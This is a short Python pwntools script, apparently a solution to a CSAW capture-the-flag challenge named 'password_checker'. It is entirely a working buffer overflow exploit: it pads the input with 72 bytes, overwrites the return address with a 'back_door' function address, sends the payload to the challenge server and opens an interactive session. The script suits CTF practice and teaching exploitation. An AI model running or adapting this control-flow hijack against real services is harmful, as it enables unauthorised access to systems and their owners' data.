#!/usr/bin/env python3

from pwn import *

context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/password_checker'
context.log_level = 'debug'

back_door = p64(0x401172)
OFFSET = 72
junk = b"A" * OFFSET

p = remote('pwn.chal.csaw.io', 5000, ssl=False)
#p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/password_checker')


payload = [
    junk,
    back_door,
]

log.info(f"back door sanity check after packing and unpacking @ {hex(u64(back_door))}")
payload = b''.join(payload)
p.sendline(payload)


p.interactive()
